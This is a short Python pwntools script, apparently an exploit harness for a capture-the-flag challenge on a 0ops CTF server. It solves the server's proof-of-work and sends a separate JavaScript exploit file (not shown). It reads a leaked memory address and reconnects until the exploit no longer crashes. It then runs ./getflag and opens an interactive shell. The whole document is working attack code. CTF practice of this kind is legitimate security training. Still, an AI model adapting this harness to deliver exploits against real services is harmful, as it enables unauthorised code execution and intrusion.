from pwn import *
#context.log_level = 'debug'
#p = remote('chall.ctf.0ops.sjtu.cn', 36000)
HOST = 'chall.ctf.0ops.sjtu.cn'
PORT = 36000
def dopow():
    p.recvuntil(b'2^(2^', drop=True)
    t = int(p.recvuntil(b')',drop=True),10)
    p.recvuntil(b'mod ',drop=True)
    n = int(p.recvuntil(b' ',drop=True),10)
    oth = process(['./pow', str(t), str(n)])
    p.sendafter(b'answer: ', oth.recvline())
    oth.close()

with open('./exp.js', 'rb') as f:
    inp = f.read()

payload = b''
payload += inp
payload = payload.ljust(30000, b' ')

while True:
    p = remote(HOST, PORT)
    dopow()
    p.sendafter(b'script:\n', payload)
    p.recvuntil(b'leak: ')
    leak = int(p.recvuntil(b'\n', True), 16)
    print(f'leak: 0x{leak:x}')
    p.recvuntil(b'call hax\n')
    ret = p.recvuntil(b'\n', timeout=1)
    if b'SEGV_MAPERR' not in ret:
        break
    p.close()

context.log_level = 'debug'
p.sendline(b'./getflag')
p.interactive()
